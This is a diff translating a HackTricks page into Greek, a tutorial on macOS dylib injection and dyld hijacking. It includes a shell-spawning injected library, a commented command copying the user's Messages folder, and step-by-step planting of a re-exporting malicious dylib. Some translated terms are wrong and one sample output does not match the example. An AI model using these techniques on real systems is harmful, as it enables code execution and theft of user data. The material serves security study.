@@ -1,23 +1,22 @@
-# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
+# macOS Διασπορά Dyld & DYLD\_INSERT\_LIBRARIES
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## DYLD\_INSERT\_LIBRARIES Basic example
+## Βασικό παράδειγμα DYLD\_INSERT\_LIBRARIES
 
-**Library to inject** to execute a shell:
-
+**Βιβλιοθήκη για ενσωμάτωση** για την εκτέλεση ενός κέλυφους:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -29,35 +28,30 @@ __attribute__((constructor))
 
 void myconstructor(int argc, const char **argv)
 {
-    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
-    printf("[+] dylib injected in %s\n", argv[0]);
-    execv("/bin/bash", 0);
-    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
+syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
+printf("[+] dylib injected in %s\n", argv[0]);
+execv("/bin/bash", 0);
+//system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-
-Binary to attack:
-
+Δυαδικός κώδικας για επίθεση:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
 
 int main()
 {
-    printf("Hello, World!\n");
-    return 0;
+printf("Hello, World!\n");
+return 0;
 }
 ```
-
-Injection:
-
+Έγχυση:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
+## Παράδειγμα Dyld Hijacking
 
-## Dyld Hijacking Example
-
-The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Το ευάλωτο δυαδικό αρχείο που επιθυμούμε να εκμεταλλευτούμε είναι το `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
 {% tab title="entitlements" %}
@@ -71,13 +65,13 @@ The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources
 ```bash
 # Check where are the @rpath locations
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
-          cmd LC_RPATH
-      cmdsize 32
-         path @loader_path/. (offset 12)
+cmd LC_RPATH
+cmdsize 32
+path @loader_path/. (offset 12)
 --
-          cmd LC_RPATH
-      cmdsize 32
-         path @loader_path/../lib2 (offset 12)
+cmd LC_RPATH
+cmdsize 32
+path @loader_path/../lib2 (offset 12)
 ```
 {% endcode %}
 {% endtab %}
@@ -87,9 +81,9 @@ otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RP
 ```bash
 # Check librareis loaded using @rapth and the used versions
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
-         name @rpath/lib.dylib (offset 24)
-   time stamp 2 Thu Jan  1 01:00:02 1970
-      current version 1.0.0
+name @rpath/lib.dylib (offset 24)
+time stamp 2 Thu Jan  1 01:00:02 1970
+current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
@@ -97,13 +91,12 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
+Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων βιβλιοθηκών** και προσπαθεί να φορτώσει μια βιβλιοθήκη από:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-However, the first one doesn't exist:
-
+Ωστόσο, η πρώτη δεν υπάρχει:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -111,8 +104,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-
-So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
+Έτσι, είναι δυνατόν να το αποκτήσουμε! Δημιουργήστε μια βιβλιοθήκη που **εκτελεί κάποιο αυθαίρετο κώδικα και εξάγει τις ίδιες λειτουργίες** με την νόμιμη βιβλιοθήκη, επανεξάγοντάς την. Και θυμηθείτε να την μεταγλωτίσετε με τις αναμενόμενες εκδόσεις:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -120,12 +112,12 @@ So, it's possible to hijack it! Create a library that **executes some arbitrary 
 
 __attribute__((constructor))
 void custom(int argc, const char **argv) {
-    NSLog(@"[+] dylib hijacked in %s", argv[0]);
+NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
 {% endcode %}
 
-Compile it:
+Το μεταγλωττίζουμε:
 
 {% code overflow="wrap" %}
 ```bash
@@ -134,28 +126,28 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
+Η διαδρομή επανεξαγωγής που δημιουργείται στη βιβλιοθήκη είναι σχετική με τον φορτωτή, ας την αλλάξουμε σε απόλυτη διαδρομή για τη βιβλιοθήκη που θέλουμε να εξαγάγουμε:
 
 {% code overflow="wrap" %}
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
-         cmd LC_REEXPORT_DYLIB
-         cmdsize 48
-         name @rpath/libjli.dylib (offset 24)
+cmd LC_REEXPORT_DYLIB
+cmdsize 48
+name @rpath/libjli.dylib (offset 24)
 
 #Change the location of the library absolute to absolute path
 install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib
 
 # Check again
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
-          cmd LC_REEXPORT_DYLIB
-      cmdsize 128
-         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
+cmd LC_REEXPORT_DYLIB
+cmdsize 128
+name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
 {% endcode %}
 
-Finally just copy it to the **hijacked location**:
+Τέλος, απλά αντιγράψτε το στην **καταχωρημένη τοποθεσία**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -163,7 +155,7 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-And **execute** the binary and check the **library was loaded**:
+Και **εκτελέστε** το δυαδικό αρχείο και ελέγξτε αν η **βιβλιοθήκη φορτώθηκε**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -171,27 +163,25 @@ And **execute** the binary and check the **library was loaded**:
 </code></pre>
 
 {% hint style="info" %}
-A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Μια καλή ανάλυση σχετικά με το πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να εκμεταλλευτείτε τα δικαιώματα της κάμερας του Telegram μπορεί να βρεθεί στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Bigger Scale
+## Μεγαλύτερη Κλίμακα
 
-If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
-
+Εάν σκοπεύετε να προσπαθήσετε να εισαγάγετε βιβλιοθήκες σε αναπάντεχα δυαδικά αρχεία, μπορείτε να ελέγξετε τα μηνύματα γεγονότων για να διαπιστώσετε πότε φορτώνεται η βιβλιοθήκη μέσα σε ένα διεργασία (σε αυτήν την περίπτωση αφαιρέστε την printf και την εκτέλεση `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
